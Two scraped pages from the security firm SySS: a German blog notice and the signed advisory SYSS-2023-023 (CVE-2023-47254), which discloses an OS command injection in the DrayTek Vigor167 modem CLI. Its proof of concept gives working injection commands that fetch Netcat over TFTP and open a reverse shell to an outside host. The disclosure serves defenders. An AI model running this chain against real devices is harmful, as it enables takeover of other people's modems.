=== Content from www.syss.de_f3b8c302_20250114_192235.html ===


* [DE](/pentest-blog/command-injection-via-cli-des-draytek-vigor167-syss-2023-023)
* EN

 Toggle navigation☰
[![SySS GmbH](/typo3conf/ext/user_site/Resources/Public/Images/syss_logo_RGB.png)](/)

* [Leistungen](/leistungen/penetrationstest "Unsere Leistungen: Penetrationstest, Digitale Forensik, Red Teaming, Live Hacking, Schulungen")
  + + [Penetrationstest](/leistungen/penetrationstest "Ein Penetration Test / Pentest / Penetrationstest ist ein simulierter Angriffsversuch auf IT-Systeme. Die IT-Sicherheit wird auf Schwachstellen geprüft.")
  + + [Technisches Consulting](/technisches-consulting "Das technische Consulting der SySS unterstützt mit der entscheidenden Expertise in IT-Sicherheitsfragen rund um Ihr Unternehmen.")
  + + [Digitale Forensik](/leistungen/digitale-forensik "Gefahren abwehren – Beweise sichern. Die Digitale Forensik der SySS unterstützt Sie bei der gerichtsverwertbaren Auswertung digitaler Spuren. ")
  + + [Red Teaming](/leistungen/red-teaming "In einem zielgerichteten Angriff gegen Ihr Unternehmensnetzwerk prüft die Red Team-Abteilung der SySS Ihre IT-Sicherheitsmaßnahmen.")
  + + [Live-Hacking](/leistungen/live-hacking "Im Live-Hacking führen die IT-Spezialisten der SySS eindrucksvoll – und live – vor Augen, wie leicht es ist, an die Daten Dritter zu gelangen.")
  + + [Schulung](/leistungen/schulung "Schulung: Die SySS bietet umfassende Schulungen zu aktuellen Fragen und Vorgehensweisen in der IT Security. Treten Sie ein in die Welt des Hackens!")
  + + [Kontaktformular](/leistungen/kontaktformular "Kontakt: Formular zur schnellen Kontaktaufnahme mit der SySS. Mit diesem Kontaktformular haben Sie immer die schnellste Direktverbindung zu uns.")
* [Über uns](/ueber-uns/syss-gmbh "Über uns")
  + + [SySS](/ueber-uns/syss-gmbh "Die SySS ist Marktführer für Penetrationstests in Deutschland. Wir verfügen durch zahlreiche Projekte über umfangreiche Erfahrung. ")
  + + [Sebastian Schreiber](/ueber-uns/sebastian-schreiber "Diplom-Informatiker Sebastian Schreiber gründete die SySS bereits 1998 und ist bis heute Geschäftsführer des stetig wachsenden Unternehmens.")
  + + [Referenzen](/ueber-uns/referenzen "Wir zählen sowohl kleine und mittelständische Unternehmen als auch Weltkonzerne zu unseren Kunden, darunter viele, die wir seit vielen Jahren betreuen.")
* [Pentest Blog](/pentest-blog "Pentest_Blog")
  + + [Pentest Blog](/pentest-blog "Der SySS Pentest Blog berichtet tagesaktuell über IT-Sicherheitsthemen, Ergebnisse unserer R&D-Abteilung, neue Security Advisories, Veranstaltungen u. v. m.")
  + + [Tech Blog](/pentest-blog/tech-blog "Im Tech Blog teilt die SySS Fachartikel und kürzere Blogbeiträge zu relevanten wie auch spannenden Entdeckungen in der IT-Welt mit der Tech Community.")
  + + [Pentest TV](/pentest-tv "Auf unserem SySS YouTube-Kanal \"SySS Pentest TV\" stellen wir Videobeiträge von den und über die Pentest Experts mit dem Fokus auf IT-Sicherheit vor.

      ")
  + + [Pentest Library](/pentest-blog/pentest-library "In der Pentest Library finden Sie unser Whitepaper, die SySS Responsible Disclosure Policy sowie zahlreiche Fachartikel und Konferenzvorträge.")
* [Jobs & Karriere](/jobs-karriere/syss-als-arbeitgeber "Jobs & Karriere")
  + + [SySS als Arbeitgeber](/jobs-karriere/syss-als-arbeitgeber "Die SySS stellt ihr Stellenangebot vor. SySS steht für Verantwortung & Qualität, Unabhängigkeit & Aktualität, Zusammenhalt und soziales Engagement. ")
  + + [Benefits bei SySS](/jobs-karriere/benefits-bei-syss "Die SySS bietet Benefits wie flexible Arbeitszeiten, zusätzlichen Urlaub, ein transparentes Gehaltsystem, Weiterbildungsangebote uvm.")
  + + [Einsteigen bei SySS](/jobs-karriere/einsteigen-bei-syss "Die SySS sucht motivierte Kolleginnen und Kollegen für anspruchsvolle und vielseitige Aufgaben. Bewerben Sie sich direkt und überzeugen Sie uns von sich!")
  + + [Wachsen mit SySS](/jobs-karriere/wachsen-mit-syss "Wählen Sie Ihren Weg, gestalten Sie Ihren persönlichen Entwicklungsgang in einem aufstrebenden Unternehmen mit und wachsen Sie zum Experten heran.")
  + + [Bewerben bei SySS](/jobs-karriere/bewerben-bei-syss "Von unseren Bewerbern erwarten wir neben fachlichen Qualifikationen auch das Interesse, über den Tellerrand hinauszublicken – fachlich und sozial.")
* [Presse](/presse "Die SySS Security-Spezialisten sind gefragte Ansprechpartner für die Medien. Wir stehen Ihnen mit unserer Expertise gerne zur Verfügung.")
* [Kontakt](/kontakt/ansprechpersonen "Kontakt")
  + + [Ansprechpersonen](/kontakt/ansprechpersonen "Wir sorgen wir für die Sicherheit Ihrer IT. Wir beraten Sie gerne persönlich. Hier finden Sie unsere individuellen Kontaktdaten.")
  + + [Niederlassungen](/kontakt/niederlassungen "Neben unserer Hauptgeschäftsstelle in Tübingen haben wir auch drei weitere Niederlassungen in Frankfurt am Main, München und Wien.")
  + + [PGP Keys](/kontakt/pgp-keys "Hier finden Sie die PGP Keys der SySS-Mitarbeitenden. So stellen wir für Sie eine sichere Kommunikation mit der SySS bereit.")
  + + [Anfahrt und Hotels](/kontakt/anfahrt-und-hotels "Hier finden Sie die Anfahrt zu unseren Hauptgeschäftsstelle in Tübingen und Empfehlungen zu Hotels für einen schönen Aufenthalt bei uns in Tübingen. ")
* [Suche](/suche "Suche")

![](/fileadmin/bilder/00_Header-Bilder/2023/04_Blog_Jubilaeum.png)

![](/typo3conf/ext/user_site/Resources/Public/Images/01_HOME_Schreiber_oZitat.jpg "SySS")

* [Pentest Blog](/pentest-blog "Der SySS Pentest Blog berichtet tagesaktuell über IT-Sicherheitsthemen, Ergebnisse unserer R&D-Abteilung, neue Security Advisories, Veranstaltungen u. v. m.")
* [Tech Blog](/pentest-blog/tech-blog "Im Tech Blog teilt die SySS Fachartikel und kürzere Blogbeiträge zu relevanten wie auch spannenden Entdeckungen in der IT-Welt mit der Tech Community.")
* [Pentest TV](/pentest-tv "Auf unserem SySS YouTube-Kanal \"SySS Pentest TV\" stellen wir Videobeiträge von den und über die Pentest Experts mit dem Fokus auf IT-Sicherheit vor.

  ")
* [Pentest Library](/pentest-blog/pentest-library "In der Pentest Library finden Sie unser Whitepaper, die SySS Responsible Disclosure Policy sowie zahlreiche Fachartikel und Konferenzvorträge.")

1. [Ihr Experte für Penetrationstests](/ "SySS GmbH - The Pentest Experts")
2. [Pentest Blog](/pentest-blog "Pentest_Blog")
3. [Pentest Blog](/pentest-blog "Pentest Blog: Aktuelle IT-Sicherheitsthemen")
4. Command Injection via CLI des DrayTek Vigor167 (SYSS-2023-023)

# Command Injection via CLI des DrayTek Vigor167 (SYSS-2023-023)

06.12.2023
–
![](/typo3conf/ext/user_site/Resources/Public/Images/blog-category-advisories.svg)
– SYSS-2023-023

## Ein Security Advisory von Senior IT Security Consultant Fabian Krone

Die Kommandozeile (Command-Line Interface, CLI) des DrayTek Vigor167 mit der Modemfirmware 5.2.2 erlaubt es angemeldeten Angreifenden, beliebigen Code auf dem Modem auszuführen. Nutzende mit Zugang zur Weboberfläche, aber ohne jegliche Berechtigungen, haben ebenfalls Zugriff auf die CLI und können hierüber das Modem übernehmen.

Detaillierte Informationen zu dieser Schwachstelle finden Sie in unserem Security Advisory / You will find detailed information about this security issue in our Security Advisory:

* [SYSS-2023-023 (CVE-2023-47254)](/fileadmin/dokumente/Publikationen/Advisories/SYSS-2023-023.txt)

[Weitere Informationen über unsere Responsible Disclosure Policy bei der Veröffentlichung von Security Advisories finden Sie hier.](https://www.syss.de/syss-responsible-disclosure-policy/)

[You will find further information about our Responsible Disclosure Policy concerning the publishing process of SySS Security Advisories here.](https://www.syss.de/en/responsible-disclosure-policy/)

---

![](/typo3conf/ext/user_site/Resources/Public/Images/blog-category-advisories.svg)![](/typo3conf/ext/user_site/Resources/Public/Images/blog-category-building.svg)
#### [Building SySS](/pentest-blog/category/building-syss)

![](/typo3conf/ext/user_site/Resources/Public/Images/blog-category-forensics.svg)
#### [Digital Forensics](/pentest-blog/category/digital-forensics)

![](/typo3conf/ext/user_site/Resources/Public/Images/blog-category-events.svg)
#### [Events](/pentest-blog/category/events)

![](/typo3conf/ext/user_site/Resources/Public/Images/blog-category-media.svg)
#### [In the Media](/pentest-blog/category/in-the-media)

![](/typo3conf/ext/user_site/Resources/Public/Images/blog-category-know-how.svg)
#### [Know-how](/pentest-blog/category/know-how)

![](/typo3conf/ext/user_site/Resources/Public/Images/blog-category-news.svg)
#### [News](/pentest-blog/category/news)

![](/typo3conf/ext/user_site/Resources/Public/Images/blog-category-r-d.svg)
#### [Research](/pentest-blog/category/research)

![](/typo3conf/ext/user_site/Resources/Public/Images/blog-category-secutorial.svg)
#### [Secutorial](/pentest-blog/category/secutorial)

![](/typo3conf/ext/user_site/Resources/Public/Images/rss.svg)
#### [RSS-Feed](/pentest-blog/rss-feed?type=200)

#### [SySS Newsletter abonnieren](/syss-newsletter)

## [Termine](/kalender)

14.01.2025
- 15.01.2025

[Hack1/Hack2: Hacking Workshop](/kalender/termin/hack1-hack2-hacking-workshop-1-20250114)

16.01.2025
- 17.01.2025

[Hack1/Hack2: Hacking Workshop](/kalender/termin/hack1-hack2-hacking-workshop-1-20250116)

27.01.2025
- 28.01.2025

[Hack4: Angriffe gegen VoIP-Infrastrukturen](/kalender/termin/hack4-angriffe-gegen-voip-infrastrukturen-20250127)

03.02.2025

[Secu5: Planung und Durchführung von Penetrationstests](/kalender/termin/secu5-planung-und-durchfuehrung-von-penetrationstests-20250203)

Ihr direkter Kontakt zu SySS +49 (0)7071 - 40 78 56-0 oder anfrage@syss.de |
IN DRINGENDEN FÄLLEN AUSSERHALB DER GESCHÄFTSZEITEN +49 (0)7071
- 40 78 56-99

Als Rahmenvertragskunde wählen Sie bitte die bereitgestellte Rufbereitschaftsnummer

Ihr direkter Kontakt zu SySS +49 (0)7071 - 40 78 56-0 oder anfrage@syss.de

IN DRINGENDEN FÄLLEN AUSSERHALB DER GESCHÄFTSZEITEN +49 (0)7071 - 40 78 56-99

Als Rahmenvertragskunde wählen Sie bitte die bereitgestellte Rufbereitschaftsnummer

Direkter Kontakt

+49 (0)7071 - 40 78 56-0 oder anfrage@syss.de

IN DRINGENDEN FÄLLEN AUSSERHALB DER GESCHÄFTSZEITEN

+49 (0)7071 - 40 78 56-99

Als Rahmenvertragskunde wählen Sie bitte die bereitgestellte Rufbereitschaftsnummer

* [Leistungen](/leistungen/penetrationstest "Unsere Leistungen: Penetrationstest, Digitale Forensik, Red Teaming, Live Hacking, Schulungen")
* [Über uns](/ueber-uns/syss-gmbh "Über uns")
* [Pentest Blog](/pentest-blog "Pentest_Blog")
* [Jobs & Karriere](/jobs-karriere/syss-als-arbeitgeber "Jobs & Karriere")
* [Presse](/presse "Die SySS Security-Spezialisten sind gefragte Ansprechpartner für die Medien. Wir stehen Ihnen mit unserer Expertise gerne zur Verfügung.")
* [Kontakt](/kontakt/ansprechpersonen "Kontakt")
* [Suche](/suche "Suche")

[![Newsletter abonnieren](/typo3conf/ext/user_site/Resources/Public/Images/newsletterabo.svg)](/syss-newsletter)
[Newsletter abonnieren](/syss-newsletter)

Folgen Sie uns:
[![YouTube Icon](/typo3conf/ext/user_site/Resources/Public/Images/YouTube_SySS_Signatur.png)](https://www.youtube.com/c/SySSPentestTV)
[![Instagram Icon](/typo3conf/ext/user_site/Resources/Public/Images/Instagram_SySS_Signatur.png)](https://www.instagram.com/syssgmbh/)
[![LinkedIn Icon](/typo3conf/ext/user_site/Resources/Public/Images/LinkedIn_SySS_Signatur.png)](https://de.linkedin.com/company/syss-gmbh)
[![Xing Icon](/typo3conf/ext/user_site/Resources/Public/Images/Xing_SySS_Signatur.png)](https://www.xing.com/pages/syssgmbh)

© 2005 - 2025 Alle Rechte vorbehalten SySS GmbH

| [Impressum](/impressum) | [Datenschutzerklärung](/datenschutzerklaerung) |

Trotz regelmäßiger Kontrolle verlinkter Webseiten können wir nicht für fremde Inhalte haften.



=== Content from www.syss.de_a94b6a96_20250114_192235.html ===
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512
Advisory ID: SYSS-2023-023
Product: Vigor167
Manufacturer: DrayTek
Affected Version(s): 5.2.2
Tested Version(s): 5.2.2
Vulnerability Type: OS Command Injection (CWE-78)
Risk Level: Medium
Solution Status: Open
Manufacturer Notification: 2023-09-22
Solution Date: 2023-11-16
Public Disclosure: 2023-12-06
CVE Reference: CVE-2023-47254
Author of Advisory: Fabian Krone, SySS GmbH
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Overview:
Vigor167 is a VDSL2 35b Supervectoring Modem.
The manufacturer describes the product as follows (see [1]):
"Vigor167 is a VDSL2 35b modem/router."
Due to missing input validation, the command-line interface of the device
is vulnerable to an OS command injection.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Vulnerability Details:
Vigor167 has a command-line interface available via both Telnet and
SSH. This interface requires a login with any account available in the
web interface. This also includes accounts which were denied every access
according to their group settings.
Afterward, a limited set of commands is available to the user. The
ping command present allows injecting commands which are then executed
on the device.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Proof of Concept (PoC):
Commands can be injected with backticks (``). The current working
directory can be printed out with the following command:
vigor> exec ping `pwd`
ping: /tmp: Unknown host
Another possibility is to wrap the OS command in parentheses following
a dollar sign like $(pwd).
The available commands are very limited. For example, only a small
fraction of the standard output from the injected commands is displayed.
Furthermore, space characters lead to evaluation errors.
In order to achieve a full reverse shell, some of BusyBox's internal
commands can be used.
A TFTP server is hosted as preparation on a computer which is reachable by
Vigor167 over the network. A statically compiled version of Netcat[2] is hosted
on the TFTP server.
First, the operating system of Vigor167 is instructed to download the file:
vigor> exec ping `busybox${IFS}tftp${IFS}-l${IFS}/tmp/netcat${IFS}-g${IFS}-r${IFS}netcat${IFS}192.168.100.5`
BusyBox v1.00 (2023.05.29-03:34+0000) multi-call binary
usage: ping [OPTION]... host
${IFS} is a POSIX variable that contains the field separator and serves as
replacement for the space character.
Then, the executable flag is set on the transferred Netcat binary:
vigor> exec ping `chmod${IFS}+x${IFS}/tmp/netcat`
BusyBox v1.00 (2023.05.29-03:34+0000) multi-call binary
usage: ping [OPTION]... host
On the computer hosting the TFTP server, a Netcat listener is opened. Then,
a reverse shell can be spawned:
vigor> exec ping `/tmp/netcat${IFS}192.168.100.5${IFS}9001${IFS}-e${IFS}ash`
The reverse shell is opened to the targeted host:
Connection from 192.168.100.1:43354
sh: turning off NDELAY mode
pwd
/tmp
Vigor167 was used in modem mode.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Solution:
Update the modem's firmware to version 5.2.3.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclosure Timeline:
2023-07-30: Vulnerability discovered
2023-09-22: Vulnerability reported to manufacturer
2023-11-16: Patch released by manufacturer
2023-12-06: Public disclosure of vulnerability
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
References:
[1] Product website for Vigor167
https://www.draytek.com/products/vigor167
[2] Statically compiled MIPS32 Netcat
https://github.com/darkerego/mips-binaries/blob/master/netcat
[3] SySS Security Advisory SYSS-2023-023
https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2023-023.txt
[4] SySS Responsible Disclosure Policy
https://www.syss.de/en/responsible-disclosure-policy
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Credits:
This security vulnerability was found by Fabian Krone of SySS
GmbH.
E-Mail: fabian.krone@syss.de
Public Key: https://www.syss.de/fileadmin/dokumente/PGPKeys/Fabian\_Krone.asc
Key ID: 0xBFDF30ABD10EA0F4
Key Fingerprint: 0ADE D2AA AE27 7DDA A8F0 C051 BFDF 30AB D10E A0F4
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclaimer:
The information provided in this security advisory is provided "as is"
and without warranty of any kind. Details of this security advisory may
be updated in order to provide as accurate information as possible. The
latest version of this security advisory is available on the SySS website.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Copyright:
Creative Commons - Attribution (by) - Version 3.0
URL: http://creativecommons.org/licenses/by/3.0/deed.en
-----BEGIN PGP SIGNATURE-----
iQIzBAEBCgAdFiEECt7Sqq4nfdqo8MBRv98wq9EOoPQFAmVouRMACgkQv98wq9EO
oPRkjhAAnkZCXYM9lqXIbN+pGZoA2Zv93z8JXv34vIhCahv1G47ocJ0L7kLb7KNz
+EbLTEnoh9Kxukw7tjNV6zvHRhav2o5KQBaelgGyCAmgtcKp30eCkN0sO4ocBqm5
wBYbYxVzOk6+aMOxIR6B496lT5AvFtzHXeCuwm4Vewpv/v7L78ixA1vnD+cjJuHq
BdA/IYxrQKUEeZBlBqNM1WFe2AUxhaxGnskBrQtnZcblrJwLj3CY4UCbAehFCN29
p0iw6ntnMfpSP85nwM7mNIQo1UFWvA3Dnx6sVK7LjokX+bBAgrjjklxUdZoN1exa
htT12p6lE9UNWteFt0xkgdMRkTM48CUsDpiQORIRTbb20Haz9byNTieH3UxX/OLE
mU/D/BhfX4F55f0Yxlz/kJ+5hLEv4EUUIfuM4uM6vntH1E8Y/FGMxdpWVqtvCU64
U6mr52/ZLWKxyyp1+qZn2UpkP9zntO8sNUd2Yt3TqpNfOydJGNff//A5gqPkJy6B
s1bZEYNWN6zpkkVukFT+EIjQHyA8OaTud8TUmo0uuvN240S74yqKpb7czaAjdOwn
c5h6IlqEYu70lpnEc2d9UFRN4nGJ/NiLuimDbFjaqtjzGa+rDFNNSHDvS8jN+tN5
bgZ6SPy+mXNh07dqET/SVaI8P/yIZmNIENtNrW7z6fbr6F+aKfk=
=7izf
-----END PGP SIGNATURE-----

